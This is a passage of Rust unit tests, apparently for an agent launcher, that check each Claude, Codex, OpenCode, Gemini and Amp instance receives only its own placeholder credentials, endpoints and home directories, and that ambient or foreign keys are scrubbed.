            .and_then(|value| value.to_str()),
        Some("selected-opencode-key")
    );
    assert!(opencode.get_env("CLAUDE_CODE_OAUTH_TOKEN").is_none());
    assert!(opencode.get_env("OPENAI_API_KEY").is_none());

    let mut claude = build_agent_command(&spawn_spec(
        "claude",
        "claude-oauth",
        Some("oauth_token"),
        &empty,
    ));
    super::apply_account_env(
        &mut claude,
        "claude-oauth",
        Some("oauth_token"),
        Some("claude"),
        &credentials,
    );
    assert_eq!(
        claude
            .get_env("CLAUDE_CODE_OAUTH_TOKEN")
            .and_then(|value| value.to_str()),
        Some("selected-oauth-token")
    );
    assert_eq!(
        claude
            .get_env("ANTHROPIC_BASE_URL")
            .and_then(|value| value.to_str()),
        Some("https://anthropic.example")
    );
    assert!(claude.get_env("OPENAI_API_KEY").is_none());

    let mut routed_claude = build_agent_command(&spawn_spec(
        "claude",
        "claude-routed",
        Some("api_key"),
        &empty,
    ));
    super::apply_account_env(
        &mut routed_claude,
        "claude-routed",
        Some("api_key"),
        Some("zai"),
        &credentials,
    );
    assert_eq!(
        routed_claude
            .get_env("ANTHROPIC_AUTH_TOKEN")
            .and_then(|value| value.to_str()),
        Some("selected-zai-token")
    );
    assert_eq!(
        routed_claude
            .get_env("ANTHROPIC_BASE_URL")
            .and_then(|value| value.to_str()),
        Some("https://api.z.ai/api/anthropic")
    );
    assert!(routed_claude.get_env("OPENAI_API_KEY").is_none());
}

#[test]
fn moonshot_opencode_credential_requires_selected_surface_and_rejects_foreign_key() {
    let credentials: jackin_protocol::AgentCredentialEnv =
        serde_json::from_value(serde_json::json!({
            "schema_version": 2,
            "instances": {
                "opencode-kimi": {
                    "agent": "opencode",
                    "account_id": "acc-kimi",
                    "env": {
                        "MOONSHOT_API_KEY": "selected-moonshot-key",
                        "OPENAI_API_KEY": "foreign-openai-sentinel"
                    },
                },
            },
        }))
        .expect("credential fixture must decode");
    let empty: Vec<(String, String)> = Vec::new();

    let mut selected = build_agent_command(&spawn_spec(
        "opencode",
        "opencode-kimi",
        Some("api_key"),
        &empty,
    ));
    super::apply_account_env(
        &mut selected,
        "opencode-kimi",
        Some("api_key"),
        Some("kimi"),
        &credentials,
    );
    assert_eq!(
        selected
            .get_env(jackin_core::MOONSHOT_API_KEY_ENV_NAME)
            .and_then(|value| value.to_str()),
        Some("selected-moonshot-key")
    );
    assert!(selected.get_env("OPENAI_API_KEY").is_none());

    let mut unselected = build_agent_command(&spawn_spec(
        "opencode",
        "opencode-kimi",
        Some("api_key"),
        &empty,
    ));
    super::apply_account_env(
        &mut unselected,
        "opencode-kimi",
        Some("api_key"),
        None,
        &credentials,
    );
    assert!(unselected.get_env("MOONSHOT_API_KEY").is_none());
}

#[test]
fn routed_claude_credentials_require_selected_surface() {
    let credentials: jackin_protocol::AgentCredentialEnv =
        serde_json::from_value(serde_json::json!({
            "schema_version": 2,
            "instances": {
                "claude-routed": {
                    "agent": "claude",
                    "account_id": "acc-zai",
                    "env": {
                        "ANTHROPIC_AUTH_TOKEN": "selected-zai-token",
                        "ANTHROPIC_BASE_URL": "https://api.z.ai/api/anthropic"
                    },
                },
            },
        }))
        .expect("credential fixture must decode");
    let empty: Vec<(String, String)> = Vec::new();
    let mut selected = build_agent_command(&spawn_spec(
        "claude",
        "claude-routed",
        Some("api_key"),
        &empty,
    ));
    super::apply_account_env(
        &mut selected,
        "claude-routed",
        Some("api_key"),
        Some("zai"),
        &credentials,
    );
    assert_eq!(
        selected
            .get_env("ANTHROPIC_AUTH_TOKEN")
            .and_then(|value| value.to_str()),
        Some("selected-zai-token")
    );

    let mut unselected = build_agent_command(&spawn_spec(
        "claude",
        "claude-routed",
        Some("api_key"),
        &empty,
    ));
    super::apply_account_env(
        &mut unselected,
        "claude-routed",
        Some("api_key"),
        None,
        &credentials,
    );
    assert!(
        unselected.get_env("ANTHROPIC_AUTH_TOKEN").is_none(),
        "routed Claude credentials must not inject without a selected provider surface"
    );
}

#[test]
fn google_alias_is_scrubbed_from_siblings_while_selected_credential_is_injected() {
    let credentials: jackin_protocol::AgentCredentialEnv =
        serde_json::from_value(serde_json::json!({
            "schema_version": 2,
            "instances": {
                "gemini-work": {
                    "agent": "gemini",
                    "account_id": "acc-work",
                    "env": {"GEMINI_API_KEY": "work-secret"},
                },
                "gemini-personal": {
                    "agent": "gemini",
                    "account_id": "acc-personal",
                    "env": {"GEMINI_API_KEY": "personal-secret"},
                },
            },
        }))
        .expect("v2 fixture must decode");
    let ambient = vec![(
        jackin_core::GOOGLE_API_KEY_ENV_NAME.to_owned(),
        "ambient-secret".to_owned(),
    )];

    let mut unselected = build_agent_command(&spawn_spec(
        "gemini",
        "gemini-unselected",
        Some("ignore"),
        &ambient,
    ));
    super::apply_account_env(
        &mut unselected,
        "gemini-unselected",
        Some("ignore"),
        None,
        &credentials,
    );
    assert!(
        unselected
            .get_env(jackin_core::GOOGLE_API_KEY_ENV_NAME)
            .is_none()
    );
    assert!(
        unselected
            .get_env(jackin_core::GEMINI_API_KEY_ENV_NAME)
            .is_none()
    );

    let mut work = build_agent_command(&spawn_spec(
        "gemini",
        "gemini-work",
        Some("api_key"),
        &ambient,
    ));
    super::apply_account_env(
        &mut work,
        "gemini-work",
        Some("api_key"),
        Some("google"),
        &credentials,
    );
    assert_eq!(
        work.get_env(jackin_core::GEMINI_API_KEY_ENV_NAME)
            .and_then(|value| value.to_str()),
        Some("work-secret")
    );
    assert!(work.get_env(jackin_core::GOOGLE_API_KEY_ENV_NAME).is_none());

    let mut personal = build_agent_command(&spawn_spec(
        "gemini",
        "gemini-personal",
        Some("api_key"),
        &ambient,
    ));
    super::apply_account_env(
        &mut personal,
        "gemini-personal",
        Some("api_key"),
        Some("google"),
        &credentials,
    );
    assert_eq!(
        personal
            .get_env(jackin_core::GEMINI_API_KEY_ENV_NAME)
            .and_then(|value| value.to_str()),
        Some("personal-secret")
    );
    assert!(
        personal
            .get_env(jackin_core::GOOGLE_API_KEY_ENV_NAME)
            .is_none()
    );
}

#[test]
fn unassigned_instance_cannot_inherit_another_instances_provider_key() {
    let credentials: jackin_protocol::AgentCredentialEnv =
        serde_json::from_value(serde_json::json!({
            "schema_version": 2,
            "instances": {
                "opencode-personal": {
                    "agent": "opencode",
                    "account_id": "acc-personal",
                    "env": {"OPENAI_API_KEY": "opencode-secret"},
                },
            },
        }))
        .expect("v2 fixture must decode");
    let empty: Vec<(String, String)> = Vec::new();
    let mut cmd = build_agent_command(&spawn_spec("codex", "codex-work", Some("ignore"), &empty));
    super::apply_account_env(&mut cmd, "codex-work", Some("ignore"), None, &credentials);
    assert!(cmd.get_env("OPENAI_API_KEY").is_none());
    assert!(!format!("{credentials:?}").contains("opencode-secret"));
}

#[test]
fn claude_session_owns_its_durable_config_directory_for_every_auth_mode() {
    let passthrough = vec![("CLAUDE_CONFIG_DIR".to_owned(), "/stale-profile".to_owned())];
    for mode in ["sync", "api_key", "oauth_token", "ignore"] {
        let command = build_agent_command(&spawn_spec(
            "claude",
            "claude-work",
            Some(mode),
            &passthrough,
        ));
        assert_eq!(
            command.get_env("CLAUDE_CONFIG_DIR"),
            Some(std::ffi::OsStr::new(
                jackin_core::container_paths::CLAUDE_CONFIG_DIR
            ))
        );
    }
}

#[test]
fn secondary_instance_gets_its_own_home_and_forwarded_dir() {
    let hostile = vec![
        ("CLAUDE_CONFIG_DIR".to_owned(), "/stale-profile".to_owned()),
        ("CODEX_HOME".to_owned(), "/foreign-codex".to_owned()),
        ("HOME".to_owned(), "/foreign-home".to_owned()),
    ];
    let spec = AgentSpawnSpec {
        agent: "claude",
        instance: "claude-personal",
        home_dir: "/home/agent/.claude-claude-personal",
        forwarded_dir: "/jackin/claude-claude-personal",
        model: None,
        effort: None,
        auth_mode: Some("sync"),
        env_passthrough: &hostile,
        cwd: Path::new("/workspace"),
        codename: "test",
        identity: jackin_protocol::SessionIdentity {
            uid: 2_001,
            gid: 2_001,
        },
    };
    let cmd = build_agent_command(&spec);
    let env = |name: &str| cmd.get_env(name).and_then(|v| v.to_str());
    assert_eq!(
        env("CLAUDE_CONFIG_DIR"),
        Some("/home/agent/.claude-claude-personal")
    );
    assert!(env("CODEX_HOME").is_none());
    assert_eq!(env("HOME"), Some("/home/agent/.claude-claude-personal"));
    assert_eq!(env(jackin_protocol::INSTANCE_ENV), Some("claude-personal"));
    assert_eq!(
        env(jackin_protocol::INSTANCE_FORWARDED_DIR_ENV),
        Some("/jackin/claude-claude-personal")
    );
    assert_eq!(env("JACKIN_AGENT"), Some("claude"));

    // A codex pane never inherits another runtime's folder var either.
    let spec = AgentSpawnSpec {
        agent: "codex",
        instance: "codex-work",
        home_dir: "/home/agent/.codex",
        forwarded_dir: "/jackin/codex",
        model: None,
        effort: None,
        auth_mode: Some("sync"),
        env_passthrough: &hostile,
        cwd: Path::new("/workspace"),
        codename: "test",
        identity: jackin_protocol::SessionIdentity {
            uid: 2_002,
            gid: 2_002,
        },
    };
    let cmd = build_agent_command(&spec);
    let env = |name: &str| cmd.get_env(name).and_then(|v| v.to_str());
    assert_eq!(env("CODEX_HOME"), Some("/home/agent/.codex"));
    assert_eq!(env("HOME"), Some("/home/agent/.codex"));
    assert!(env("CLAUDE_CONFIG_DIR").is_none());
}

#[test]
fn agent_home_matches_folder_var_target_for_parent_and_xdg_kinds() {
    // `HOME` echoes the instance home (the folder-var target) for every
    // folder-var kind — not just `Dir`. Values pinned by the slot-layout
    // tests; the spawn layer must carry them through unchanged.
    for (agent, home_dir, folder_var) in [
        ("gemini", "/home/agent", "GEMINI_CLI_HOME"),
        ("amp", "/home/agent/.local/share", "XDG_DATA_HOME"),
    ] {
        let spec = AgentSpawnSpec {
            agent,
            instance: "test-instance",
            home_dir,
            forwarded_dir: "/jackin/test-instance",
            model: None,
            effort: None,
            auth_mode: Some("sync"),
            env_passthrough: &[],
            cwd: Path::new("/workspace"),
            codename: "test",
            identity: jackin_protocol::SessionIdentity {
                uid: 2_001,
                gid: 2_001,
            },
        };
        let cmd = build_agent_command(&spec);
        let env = |name: &str| cmd.get_env(name).and_then(|v| v.to_str());
        assert_eq!(env(folder_var), Some(home_dir), "{agent} folder var");
        assert_eq!(env("HOME"), Some(home_dir), "{agent} HOME");
    }
}

#[test]
fn same_agent_instances_keep_model_home_endpoint_and_credential_bound_to_config_id() {
    let credentials: jackin_protocol::AgentCredentialEnv =
        serde_json::from_value(serde_json::json!({
            "schema_version": 2,
            "instances": {
                "codex-work": {
                    "agent": "codex",
                    "account_id": "openai-work",
                    "env": {
                        "OPENAI_API_KEY": "work-key",
                        "OPENAI_BASE_URL": "https://work.example.test/v1",
                    },
                },
                "codex-personal": {
                    "agent": "codex",
                    "account_id": "openai-personal",
                    "env": {
                        "OPENAI_API_KEY": "personal-key",
                        "OPENAI_BASE_URL": "https://personal.example.test/v1",
                    },
                },
            },
        }))
        .expect("v2 fixture must decode");
    let hostile_passthrough = vec![
        ("CODEX_HOME".to_owned(), "/foreign-codex".to_owned()),
        ("OPENAI_API_KEY".to_owned(), "ambient-key".to_owned()),
        (
            "OPENAI_BASE_URL".to_owned(),
            "https://ambient.example.test/v1".to_owned(),
        ),
        (
            jackin_core::CODEX_LANE_MODEL_ENV_NAME.to_owned(),
            "ambient-model".to_owned(),
        ),
        (
            jackin_core::CODEX_LANE_EFFORT_ENV_NAME.to_owned(),
            "high".to_owned(),
        ),
    ];
    let fixtures = [
        (
            "codex-work",
            "openai-work",
            "/home/agent/.codex",
            "/jackin/codex",
            "gpt-5.2-codex",
            "medium",
            "work-key",
            "https://work.example.test/v1",
        ),
        (
            "codex-personal",
            "openai-personal",
            "/home/agent/.codex-codex-personal",
            "/jackin/codex-codex-personal",
            "gpt-5.3-codex",
            "low",
            "personal-key",
            "https://personal.example.test/v1",
        ),
    ];

    for (instance_id, account_id, home_dir, forwarded_dir, model, effort, own_key, own_endpoint) in
        fixtures
    {
        let spec = AgentSpawnSpec {
            agent: "codex",
            instance: instance_id,
            home_dir,
            forwarded_dir,
            model: Some(model),
            effort: Some(effort),
            auth_mode: Some("api_key"),
            env_passthrough: &hostile_passthrough,
            cwd: Path::new("/workspace"),
            codename: "test",
            identity: jackin_protocol::SessionIdentity {
                uid: 2_001,
                gid: 2_001,
            },
        };
        let mut command = build_agent_command(&spec);
        super::apply_account_env(
            &mut command,
            instance_id,
            Some("api_key"),
            Some("codex"),
            &credentials,
        );
        let env = |name: &str| command.get_env(name).and_then(|value| value.to_str());
        let argv = command
            .get_argv()
            .iter()
            .map(|argument| argument.to_string_lossy().into_owned())
            .collect::<Vec<_>>();

        assert_eq!(env(jackin_protocol::INSTANCE_ENV), Some(instance_id));
        assert_eq!(env("CODEX_HOME"), Some(home_dir));
        assert_eq!(
            env(jackin_protocol::INSTANCE_FORWARDED_DIR_ENV),
            Some(forwarded_dir)
        );
        assert_eq!(env("OPENAI_API_KEY"), Some(own_key));
        assert_eq!(env("OPENAI_BASE_URL"), Some(own_endpoint));
        assert_eq!(env(jackin_core::CODEX_LANE_MODEL_ENV_NAME), Some(model));
        assert_eq!(env(jackin_core::CODEX_LANE_EFFORT_ENV_NAME), Some(effort));
        assert_eq!(argv[1..].to_vec(), vec!["-m".to_owned(), model.to_owned()]);
        assert_eq!(
            credentials
                .for_instance(instance_id)
                .and_then(|env| env.get("OPENAI_API_KEY"))
                .map(String::as_str),
            Some(own_key),
            "the fixture's account binding for {instance_id} must stay exact"
        );
        assert_eq!(
            credentials
                .instance(instance_id)
                .map(|entry| entry.account_id.as_str()),
            Some(account_id),
            "the fixture must name the account selected by {instance_id}"
        );
    }
}
